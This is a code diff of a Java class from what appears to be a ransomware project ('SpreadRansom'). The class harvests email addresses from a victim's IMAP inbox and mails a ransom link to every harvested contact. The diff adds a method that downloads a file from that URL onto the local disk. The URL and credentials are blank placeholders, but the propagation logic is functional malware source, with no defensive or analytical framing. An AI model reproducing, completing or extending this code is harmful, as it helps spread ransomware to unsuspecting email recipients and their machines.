@@ -1,31 +1,32 @@
 package Agent.SpreadR;
 
 import java.util.Collection;
+import java.io.FileOutputStream;
+import java.io.IOException;
+import java.net.URL;
+import java.nio.channels.Channels;
+import java.nio.channels.ReadableByteChannel;
 import java.util.*;
 import javax.mail.*;
 import javax.mail.internet.*;
 
 public class MailSpread implements SpreadRansom {
 
-	
 	public Collection<String> scanEmailAdress() {
 		Properties props = new Properties();
 		String host = "localhost";
-		String username = ""; 
+		String username = "";
 		String password = "";
-
-		// String provider = "pop3";
-		String provider = "imap";
+		String provider = "imap";  
 
 		// Collection of Mail addresses
-		Collection<String> emails = null; // Email collection
+		Collection<String> emails = null;
 
 		try {
 			// Connect to the server
 			Session session = Session.getDefaultInstance(props, null);
 			Store store = session.getStore(provider);
 			store.connect(host, username, password);
-
 			// open the in-box folder
 			Folder inbox = store.getFolder("INBOX");
 			inbox.open(Folder.READ_ONLY);
@@ -62,9 +63,9 @@ public class MailSpread implements SpreadRansom {
 		return emails;
 	}
 
-	private static String getFrom(Message javaMailMessage) throws MessagingException {
+	private static String getFrom(Message mailMessage) throws MessagingException {
 		String from = "";
-		Address a[] = javaMailMessage.getFrom();
+		Address a[] = mailMessage.getFrom();
 		if (a == null)
 			return null;
 		for (int i = 0; i < a.length; i++) {
@@ -95,8 +96,8 @@ public class MailSpread implements SpreadRansom {
 	}
 
 	public void sendMails(Collection<String> emailsAdresses) {
-		
-		// Sender's email ID needs to be mentioned
+
+		// Sender's email ID
 		String from = " ";
 
 		// Assuming sending email from localhost
@@ -122,9 +123,16 @@ public class MailSpread implements SpreadRansom {
 			message.setSubject("This is the Subject Line!");
 
 			// actual message
-			message.setText("This is actual message");
+			String ransomURL="";
+			message.setText(ransomURL);
+			try {
+		
+				downloadRansomeUsingNIO(ransomURL);
+			} catch (IOException e) {
 
-			for (String to : emailsAdresses) // Recipient's email ID needs to be mentioned.
+			}
+
+			for (String to : emailsAdresses) // Recipient's email ID
 			{
 				// header field of the header.
 				message.addRecipient(Message.RecipientType.TO, new InternetAddress(to));
@@ -136,6 +144,17 @@ public class MailSpread implements SpreadRansom {
 		} catch (MessagingException mex) {
 			mex.printStackTrace();
 		}
+	}
+
+	private static void downloadRansomeUsingNIO(String urlStr) throws IOException {
+	
+		String file = "./";
+		URL url = new URL(urlStr);
+		ReadableByteChannel rbc = Channels.newChannel(url.openStream());
+		FileOutputStream fos = new FileOutputStream(file);
+		fos.getChannel().transferFrom(rbc, 0, Long.MAX_VALUE);
+		fos.close();
+		rbc.close();
 	}
 
 	@Override
